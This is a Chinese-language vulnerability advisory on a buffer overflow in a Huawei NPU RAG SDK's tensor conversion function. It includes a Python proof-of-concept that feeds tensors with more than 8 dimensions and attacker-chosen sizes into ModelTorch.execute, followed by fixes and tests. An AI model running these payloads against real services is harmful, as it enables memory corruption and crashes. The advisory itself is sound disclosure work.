# VULN-SEC-OA-001: AtTensor2Tensor张量维度转换缺边界检查致缓冲区溢出

## 漏洞概述

| 属性 | 值 |
|------|-----|
| 漏洞ID | VULN-SEC-OA-001 |
| 漏洞类型 | Buffer Overflow (Stack-based) |
| CWE编号 | CWE-787: Out-of-bounds Write |
| 严重程度 | **高危 (High)** |
| 影响文件 | `ops/adapter/utils/utils.cpp:81-97` |
| 影响函数 | `Utils::AtTensor2Tensor()` |
| 根因 | 缺失维度边界检查 |

---

## 1. 漏洞详情

### 1.1 漏洞代码分析

#### 问题代码 (`ops/adapter/utils/utils.cpp:81-97`)

```cpp
atb::Tensor Utils::AtTensor2Tensor(const at::Tensor &atTensor)
{
    static std::map<at::ScalarType, aclDataType> dtypeMap = {
        {at::ScalarType::Bool, ACL_BOOL},    {at::ScalarType::Byte, ACL_UINT8},  {at::ScalarType::Char, ACL_INT8},
        {at::ScalarType::Half, ACL_FLOAT16}, {at::ScalarType::Float, ACL_FLOAT}, {at::ScalarType::Int, ACL_INT32},
        {at::ScalarType::Long, ACL_INT64},   {at::ScalarType::BFloat16, ACL_BF16},
    };

    ATB_LOG_IF(!atTensor.is_contiguous(), ERROR) << "atTensor is not contiguous";
    atb::Tensor tensor;
    tensor.desc.format = static_cast<aclFormat>(GetTensorNpuFormat(atTensor));
    tensor.deviceData = atTensor.data_ptr();

    // === 漏洞位置：无边界检查 ===
    tensor.desc.shape.dimNum = atTensor.sizes().size();  // 直接赋值，可能 > 8
    for (uint64_t i = 0; i < atTensor.sizes().size(); i++) {
        tensor.desc.shape.dims[i] = atTensor.sizes()[i]; // 越界写入！
    }
    // === 漏洞代码结束 ===

    if (tensor.desc.shape.dimNum == 1 && tensor.desc.shape.dims[0] == 0) {
        tensor.desc.shape.dimNum = 0;
    }
    // ...
    return tensor;
}
```

#### 关键问题分析

| 问题点 | 说明 |
|--------|------|
| **缺失检查** | 未调用 `CHECK_TENSORDESC_DIMNUM_VALID` 宏验证维度 |
| **直接赋值** | `dimNum = atTensor.sizes().size()` 无上限约束 |
| **越界写入** | 当 `dimNum > 8` 时，`dims[i]` 写入超出数组边界 |

### 1.2 dims 数组容量确认

从 `operation_util.h:69-75` 的宏定义确认：

```cpp
#define CHECK_TENSORDESC_DIMNUM_VALID(dimNum) \
    do { \
        if ((dimNum) > (8) || (dimNum) == (0) ) { \
            ATB_LOG(ERROR) << "dimNum should be less or equal to 8 and cannot be 0, please check"; \
            return atb::ERROR_INVALID_PARAM; \
        } \
    } while (0)
```

**关键发现**：
- `atb::TensorDesc.shape.dims` 数组最大容量为 **8**
- 存在现成的检查宏 `CHECK_TENSORDESC_DIMNUM_VALID`
- 但漏洞函数 **完全未调用此宏**

### 1.3 atb::Tensor 结构推断

根据华为 ATB (Accelerated Tensor Buffer) 库规范：

```cpp
struct atb::Tensor {
    atb::TensorDesc desc;      // Tensor 描述符
    void* deviceData;          // 设备数据指针
    void* hostData;            // 主机数据指针
    uint64_t dataSize;         // 数据大小
};

struct atb::TensorDesc {
    aclDataType dtype;         // 数据类型
    aclFormat format;          // 数据格式
    atb::Shape shape;          // 形状信息
};

struct atb::Shape {
    uint64_t dimNum;           // 维度数量
    int64_t dims[8];           // 固定大小数组，最大 8 维！
};
```

---

## 2. 完整攻击路径

### 2.1 跨语言调用链

```
┌─────────────────────────────────────────────────────────────────┐
│ Python SDK (mx_rag)                                             │
│                                                                 │
│  用户创建 torch.Tensor: torch.randn(1,2,3,4,5,6,7,8,9,10)     │
│  维度数量 = 10 > 8                                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Python Binding (model_torch.cpp:216-222)                        │
│                                                                 │
│  TORCH_LIBRARY(ModelTorch, m) {                                 │
│      m.class_<ModelTorch>("ModelTorch")                         │
│          .def("execute", &ModelTorch::Execute);  // 暴露接口   │
│  }                                                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ ModelTorch::Execute (model_torch.cpp:135-189)                   │
│                                                                 │
│  std::vector<torch::Tensor> Execute(                           │
│      std::vector<torch::Tensor> atInTensors,                   │
│      std::string param)                                        │
│  {                                                              │
│      std::vector<atb::Tensor> inTensors;                       │
│      AtTensor2Tensor(atInTensors, inTensors); // 调用转换      │
│      ...                                                        │
│  }                                                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ ModelTorch::AtTensor2Tensor (model_torch.cpp:200-208)           │
│                                                                 │
│  for (auto &atTensor : atTensors) {                            │
│      atb_speed::Utils::ContiguousAtTensor(atTensor);           │
│      atb::Tensor tensor = atb_speed::Utils::AtTensor2Tensor(   │
│          atTensor);  // 调用漏洞函数                            │
│      opsTensors.push_back(tensor);                             │
│  }                                                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Utils::AtTensor2Tensor (utils.cpp:81-97)                        │
│                        ⚠️ 漏洞触发点 ⚠️                          │
│                                                                 │
│  tensor.desc.shape.dimNum = atTensor.sizes().size();           │
│  // dimNum = 10 (超过限制)                                      │
│                                                                 │
│  for (uint64_t i = 0; i < 10; i++) {                           │
│      tensor.desc.shape.dims[i] = atTensor.sizes()[i];          │
│      // dims[8], dims[9] 越界写入！                             │
│  }                                                              │
│                                                                 │
│  [栈缓冲区溢出]                                                  │
│  - 写入 dims[8] 越界                                            │
│  - 写入 dims[9] 越界                                            │
│  - 可能覆盖相邻栈变量/返回地址                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ 内存破坏后果                                                     │
│                                                                 │
│  可能影响：                                                      │
│  - tensor.desc.format                                           │
│  - tensor.deviceData                                            │
│  - 函数返回地址                                                  │
│  - 相邻栈变量                                                    │
│  = 潜在任意代码执行                                              │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 SetWeight 路径（同样受影响）

```cpp
// model_torch.cpp:120-133
int64_t ModelTorch::SetWeight(std::vector<torch::Tensor> atWeightTensors)
{
    std::vector<atb::Tensor> weigthTensors;
    AtTensor2Tensor(atWeightTensors, weigthTensors);  // 同样的漏洞路径
    return model_->SetWeight(weigthTensors);
}
```

---

## 3. PoC 构造思路

### 3.1 创建超过 8 维的 Tensor

Python PyTorch 允许创建任意维度的 Tensor：

```python
import torch

# 创建 9 维 Tensor（触发越界写入 dims[8]）
tensor_9d = torch.randn(1, 1, 1, 1, 1, 1, 1, 1, 1)

# 创建 10 维 Tensor（触发越界写入 dims[8], dims[9]）
tensor_10d = torch.randn(1, 1, 1, 1, 1, 1, 1, 1, 1, 1)

# 创建极高维度 Tensor（大量越界写入）
tensor_100d = torch.randn([1] * 100)  # 100 维！
```

### 3.2 完整 PoC 代码

```python
#!/usr/bin/env python3
"""
VULN-SEC-OA-001 PoC - Tensor Dimension Overflow

攻击思路：
1. 创建超过 8 维的 torch.Tensor
2. 通过 ModelTorch.execute() 传入恶意 Tensor
3. 触发 AtTensor2Tensor 中的栈缓冲区溢出
4. 越界写入可控数据到栈上

危害：
- 内存破坏
- 潜在代码执行（取决于栈布局）
"""

import torch
import torch_npu  # 华为 NPU 扩展

# ============================================
# PoC 1: 基础触发 - 9 维 Tensor
# ============================================
def poc_basic_trigger():
    """触发基础越界写入"""
    
    # 创建 9 维 Tensor
    # 每个维度大小可控，攻击者可以精确控制写入值
    malicious_tensor = torch.randn(1, 2, 3, 4, 5, 6, 7, 8, 9)
    
    # 确保 Tensor 在 NPU 上
    malicious_tensor = malicious_tensor.npu()
    malicious_tensor = malicious_tensor.contiguous()
    
    print(f"Tensor dimNum: {malicious_tensor.dim()}")  # 输出: 9
    print(f"Tensor sizes: {malicious_tensor.sizes()}")  # [1, 2, 3, 4, 5, 6, 7, 8, 9]
    
    # 传入 ModelTorch.execute()
    # 触发路径: Execute -> AtTensor2Tensor -> dims[8] = 9 (越界!)
    # ...
    return malicious_tensor

# ============================================
# PoC 2: 精确控制写入值
# ============================================
def poc_controlled_write():
    """精确控制越界写入的值"""
    
    # 维度大小直接写入 dims 数组
    # dims[8] = 第 9 个维度大小
    # dims[9] = 第 10 个维度大小
    
    # 构造特定值进行写入
    # 例如写入指针值或特殊整数
    target_value_8 = 0x41414141  # 写入 dims[8]
    target_value_9 = 0x42424242  # 写入 dims[9]
    
    # 创建 Tensor，前 8 维正常，第 9、10 维为攻击值
    # 注意：维度大小必须是正整数，可能需要调整策略
    tensor = torch.randn(1, 1, 1, 1, 1, 1, 1, 1, 
                         target_value_8 if target_value_8 > 0 else 1,
                         target_value_9 if target_value_9 > 0 else 1)
    
    return tensor

# ============================================
# PoC 3: 极端维度 - 大量越界写入
# ============================================
def poc_massive_overflow():
    """创建极高维度 Tensor，触发大量栈写入"""
    
    # 100 维 Tensor
    # 会向栈写入 92 个额外元素 (100 - 8)
    # 可能完全覆盖栈帧
    massive_tensor = torch.ones([1] * 100)
    
    print(f"Dimensions: {massive_tensor.dim()}")  # 100
    print(f"Overflow count: {massive_tensor.dim() - 8}")  # 92
    
    return massive_tensor

# ============================================
# PoC 4: 实际调用触发
# ============================================
def poc_full_trigger():
    """完整的触发流程"""
    
    # 前置条件：
    # 1. 华为 NPU 硬件可用
    # 2. torch_npu 正确安装
    # 3. ModelTorch 模块已编译
    
    try:
        # 导入 ModelTorch (通过 torch.ops)
        model_torch = torch.ops.ModelTorch.ModelTorch("test_model")
        
        # 创建恶意 Tensor
        malicious_input = torch.randn(1, 1, 1, 1, 1, 1, 1, 1, 1, 1).npu()
        malicious_input = malicious_input.contiguous()
        
        # 触发漏洞
        # 这里会调用 ModelTorch::Execute
        # -> AtTensor2Tensor
        # -> dims[8], dims[9] 越界写入
        result = model_torch.execute([malicious_input], "")
        
        print("[+] Vulnerability triggered!")
        return True
        
    except Exception as e:
        print(f"[-] Exception: {e}")
        # 异常可能是由于内存破坏导致的崩溃
        return False

# ============================================
# 主程序
# ============================================
if __name__ == "__main__":
    print("=" * 60)
    print("VULN-SEC-OA-001 PoC: Tensor Dimension Overflow")
    print("=" * 60)
    
    print("\n[*] PoC 1: Basic 9-dimension trigger")
    tensor = poc_basic_trigger()
    
    print("\n[*] PoC 2: Controlled write values")
    tensor = poc_controlled_write()
    
    print("\n[*] PoC 3: Massive 100-dimension overflow")
    tensor = poc_massive_overflow()
    
    print("\n[*] PoC 4: Full trigger (requires NPU hardware)")
    # poc_full_trigger()  # 需要实际 NPU 环境
```

### 3.3 漏洞触发条件

| 条件 | 要求 |
|------|------|
| Tensor 维度 | `atTensor.sizes().size() > 8` |
| Tensor 状态 | `is_contiguous()` = True (代码会检查) |
| 设备 | NPU (`torch_npu`) |
| 调用路径 | `execute()` 或 `set_weight()` |

---

## 4. 影响范围

### 4.1 受影响调用点

| 文件 | 函数 | 调用位置 | 说明 |
|------|------|----------|------|
| `model_torch.cpp` | `Execute()` | 第 146 行 | 输入 Tensor 转换 |
| `model_torch.cpp` | `Execute()` | 第 174 行 | 输出 Tensor 转换 |
| `model_torch.cpp` | `SetWeight()` | 第 131 行 | 权重 Tensor 转换 |
| `model_torch.cpp` | `CreateInternalTensorFromDesc()` | 第 52 行 | 内部 Tensor 创建 |
| `utils.cpp` | `BuildVariantPack()` | 第 73, 76 行 | 变量包构建 |

### 4.2 影响的 RAG 流程

所有使用 NPU 加速的 RAG 组件都可能受影响：

```
┌─────────────────────────────────────────────────────────────┐
│ mx_rag RAG Pipeline                                         │
│                                                             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐         │
│  │ Embedding   │  │ Retrieval   │  │ Reranking   │         │
│  │ (NPU)       │→ │ (NPU)       │→ │ (NPU)       │         │
│  └─────────────┘  └─────────────┘  └─────────────┘         │
│        ↓                ↓                ↓                  │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              ModelTorch::Execute                    │   │
│  │              (使用 AtTensor2Tensor)                 │   │
│  └─────────────────────────────────────────────────────┘   │
│                         ↓                                  │
│              ⚠️ 漏洞触发点 ⚠️                               │
└─────────────────────────────────────────────────────────────┘
```

### 4.3 真实场景攻击

攻击者可能通过以下方式触发：

1. **RAG Embedding 攻击**
   ```python
   from mx_rag.embedding.local.text_embedding import TextEmbedding
   
   # 创建高维 embedding Tensor
   malicious_embeddings = torch.randn(100, 768, 1, 1, 1, 1, 1, 1, 1, 1)
   
   # 通过 embedding 流程传入 NPU
   embedding = TextEmbedding(model_path="...", device="npu")
   # ... 可能触发漏洞
   ```

2. **模型推理攻击**
   ```python
   # 直接调用 ModelTorch
   import torch
   model = torch.ops.ModelTorch.ModelTorch("bge-large-zh")
   
   # 传入恶意高维 Tensor
   input_tensor = torch.randn([1]*20).npu()  # 20 维
   model.execute([input_tensor], "{}")
   ```

---

## 5. 利用条件

### 5.1 前置条件

| 条件 | 必要性 | 说明 |
|------|--------|------|
| **华为 NPU 硬件** | 必须 | 软件栈针对华为 NPU 设计 |
| **torch_npu 安装** | 必须 | PyTorch NPU 扩展 |
| **RAGSDK 编译** | 必须 | ops/adapter 模块已编译 |
| **用户可控 Tensor** | 必须 | 攻击者能构造输入 Tensor |

### 5.2 环境要求

```
硬件要求:
- 华为昇腾 NPU (Ascend 910/310)
- 或其他华为 AI 加速卡

软件要求:
- PyTorch >= 1.11
- torch_npu (华为 PyTorch 扩展)
- ATB SDK (华为 Tensor Buffer 库)
- RAGSDK 已编译安装
```

### 5.3 利用难度评估

| 维度 | 评估 |
|------|------|
| **漏洞发现难度** | 中等 (需理解 ATB 结构) |
| **漏洞触发难度** | 低 (直接构造高维 Tensor) |
| **漏洞利用难度** | 中高 (依赖栈布局) |
| **攻击前置条件** | 高 (需 NPU 环境) |

---

## 6. 风险评估

### 6.1 CVSS 评分

**CVSS v3.1: 7.8 (High)**

```
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

- **AV:L** - 本地攻击 (需要 NPU 环境访问)
- **AC:L** - 低攻击复杂度
- **PR:L** - 需要低权限 (能调用 SDK)
- **UI:N** - 无需用户交互
- **S:U** - 影响范围不变
- **C:H** - 高机密性影响
- **I:H** - 高完整性影响
- **A:H** - 高可用性影响

### 6.2 内存破坏可利用性分析

#### 栈布局推断

```
atb::Tensor tensor;  // 栈上分配
    ├── tensor.desc
    │     ├── desc.dtype      (4 bytes)
    │     ├── desc.format     (4 bytes)  
    │     └── desc.shape
    │           ├── shape.dimNum (8 bytes)
    │           └── shape.dims[8] (64 bytes, 固定大小!)
    ├── tensor.deviceData    (8 bytes) ← 可能被 dims[8] 覆盖?
    ├── tensor.hostData      (8 bytes)
    └── tensor.dataSize      (8 bytes)
    └── [返回地址]            ← 如果 dims 数组溢出到这里?
```

#### 溢出影响分析

当写入 `dims[8]`, `dims[9]`, ...:

| 越界写入 | 可能覆盖 | 潜在危害 |
|----------|----------|----------|
| `dims[8]` | `tensor.deviceData` 或相邻字段 | 指针篡改 |
| `dims[9-...]` | 后续栈变量/返回地址 | 代码执行 |
| 大量写入 | 整个栈帧 | 完全控制 |

### 6.3 特殊场景风险

#### 云 NPU 服务场景

如果 RAGSDK 部署在云 NPU 服务中：

```
用户 (Python SDK)
    │
    ▼
云服务 API Gateway
    │
    ▼
NPU 推理服务 (RAGSDK)
    │
    ▼
⚠️ 漏洞触发 → 内存破坏 → 容器逃逸?
```

**风险升级**：
- 远程攻击可能性增加
- 可能导致容器/沙箱逃逸
- 云服务凭证泄露风险

---

## 7. 修复建议

### 7.1 直接修复 - 添加维度检查

```cpp
// ops/adapter/utils/utils.cpp

#include "atb_speed/utils/operation_util.h"  // 引入检查宏

atb::Tensor Utils::AtTensor2Tensor(const at::Tensor &atTensor)
{
    static std::map<at::ScalarType, aclDataType> dtypeMap = {
        // ... dtype map ...
    };

    ATB_LOG_IF(!atTensor.is_contiguous(), ERROR) << "atTensor is not contiguous";
    
    // === 修复：添加维度检查 ===
    uint64_t dimNum = atTensor.sizes().size();
    if (dimNum > 8) {
        ATB_LOG(ERROR) << "Tensor dimension exceeds maximum (8): " << dimNum;
        // 返回空 Tensor 或抛出异常
        atb::Tensor emptyTensor;
        emptyTensor.desc.shape.dimNum = 0;
        return emptyTensor;
    }
    // === 修复结束 ===
    
    atb::Tensor tensor;
    tensor.desc.format = static_cast<aclFormat>(GetTensorNpuFormat(atTensor));
    tensor.deviceData = atTensor.data_ptr();

    tensor.desc.shape.dimNum = dimNum;
    for (uint64_t i = 0; i < dimNum; i++) {
        tensor.desc.shape.dims[i] = atTensor.sizes()[i];
    }

    // ... rest of function ...
    return tensor;
}
```

### 7.2 使用现有宏

```cpp
// 使用已有的检查宏
#include "atb_speed/utils/operation_util.h"

atb::Tensor Utils::AtTensor2Tensor(const at::Tensor &atTensor)
{
    uint64_t dimNum = atTensor.sizes().size();
    
    // 使用现有宏进行验证
    CHECK_TENSORDESC_DIMNUM_VALID(dimNum);  // 如果 > 8，返回错误
    
    // ... 正常处理 ...
}
```

### 7.3 Python 层面防御

```python
# mx_rag/utils/tensor_validator.py

def validate_tensor_dimensions(tensor: torch.Tensor, max_dims: int = 8) -> bool:
    """验证 Tensor 维度不超过上限"""
    if tensor.dim() > max_dims:
        raise ValueError(
            f"Tensor dimension {tensor.dim()} exceeds maximum allowed {max_dims}"
        )
    return True

# 在所有 NPU 调用前检查
def safe_execute(model, tensors, param):
    for tensor in tensors:
        validate_tensor_dimensions(tensor)
    return model.execute(tensors, param)
```

---

## 8. 检测方法

### 8.1 静态检测

```bash
# 检查缺失的维度验证
grep -n "CHECK_TENSORDESC_DIMNUM_VALID" ops/adapter/utils/utils.cpp
# 应输出: (无匹配) → 确认缺失检查

# 检查 dims 数组访问
grep -n "dims\[i\]" ops/adapter/utils/utils.cpp
# 输出: 第 96 行 → 潜在越界点
```

### 8.2 动态检测

```python
# 单元测试检测溢出
def test_dimension_overflow():
    """检测高维 Tensor 处理"""
    
    # 创建 9 维 Tensor
    tensor_9d = torch.randn(1, 1, 1, 1, 1, 1, 1, 1, 1)
    
    try:
        result = Utils.AtTensor2Tensor(tensor_9d)
        assert False, "Should have raised error for 9-dimension tensor"
    except (ValueError, RuntimeError):
        pass  # 正确拒绝
    
    # 正常 8 维 Tensor 应被接受
    tensor_8d = torch.randn(1, 2, 3, 4, 5, 6, 7, 8)
    result = Utils.AtTensor2Tensor(tensor_8d)
    assert result.desc.shape.dimNum == 8
```

### 8.3 模糊测试

```python
# 维度边界模糊测试
for dims in range(1, 20):
    try:
        tensor = torch.randn([1] * dims)
        result = model.execute([tensor], "{}")
        print(f"dims={dims}: accepted (potential overflow if > 8)")
    except Exception as e:
        print(f"dims={dims}: rejected - {e}")
```

---

## 9. 补充分析：对比安全使用模式

### 9.1 其他代码的安全实践

在 `buffer_device.cpp` 中找到了安全的使用模式：

```cpp
// buffer_device.cpp:72-73 - 安全示例
tensorDesc.shape.dims[0] = KB_1;
tensorDesc.shape.dims[1] = bufferSize / KB_1 + int(1);
// 固定只使用 dims[0] 和 dims[1]，不超过 2 维
```

在 `tensor_util.cpp` 中找到正确处理：

```cpp
// tensor_util.cpp:38-44 - 安全访问
for (size_t i = 0; i < tensorDesc.shape.dimNum; ++i) {
    // 只访问 dimNum 内的范围，安全
    ss << tensorDesc.shape.dims[i];
}
```

### 9.2 漏洞函数的不安全模式对比

```cpp
// utils.cpp:95-97 - 不安全模式
for (uint64_t i = 0; i < atTensor.sizes().size(); i++) {
    tensor.desc.shape.dims[i] = atTensor.sizes()[i];
    // 循环范围来自外部输入，无上限约束！
}
```

---

## 10. 结论

### 10.1 漏洞确认

**这是一个真实的高危缓冲区溢出漏洞**。

**确认证据**：
1. 存在明确的维度上限 (8) 定义
2. 存在现成的检查宏 `CHECK_TENSORDESC_DIMNUM_VALID`
3. 漏洞函数完全未使用该检查宏
4. 用户可通过 Python API 传入任意维度 Tensor
5. 当 `dimNum > 8` 时发生栈数组越界写入

### 10.2 利用可行性

| 场景 | 可利用性 |
|------|----------|
| **本地 NPU 环境** | 中等 (需要精确栈布局分析) |
| **云 NPU 服务** | 中高 (远程攻击可能性) |
| **批量处理服务** | 高 (自动触发) |

### 10.3 修复优先级

| 优先级 | 理由 |
|--------|------|
| **P1 (立即修复)** | 内存破坏漏洞，影响核心推理功能 |

---

## 附录 A: 相关代码位置汇总

| 文件 | 行号 | 内容 |
|------|------|------|
| `utils.cpp` | 81-97 | 漏洞函数 |
| `utils.cpp` | 94-97 | 越界写入代码 |
| `operation_util.h` | 69-75 | 维度检查宏 |
| `model_torch.cpp` | 216-222 | Python binding |
| `model_torch.cpp` | 135-189 | Execute 函数 |
| `model_torch.cpp` | 200-208 | AtTensor2Tensor 调用 |
| `model_torch.cpp` | 120-133 | SetWeight 函数 |

---

*报告生成时间: 2026-04-20*
*漏洞分析工具: OpenCode Vulnerability Scanner*
*CWE 参考: https://cwe.mitre.org/data/definitions/787.html*
